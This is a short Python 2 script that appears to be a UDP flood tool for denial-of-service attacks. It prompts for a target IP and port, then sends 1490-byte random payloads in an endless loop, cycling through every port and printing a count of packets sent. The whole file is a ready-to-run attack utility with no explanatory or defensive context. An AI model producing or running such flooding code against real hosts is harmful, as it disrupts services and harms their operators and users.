# modules

import sys
import os
import time
import socket
import random

#Times
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("bash logo.sh")
ip = raw_input("While IP Target : ")
port = input("While Port : ")
os.system("python3 src/Starter.py")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
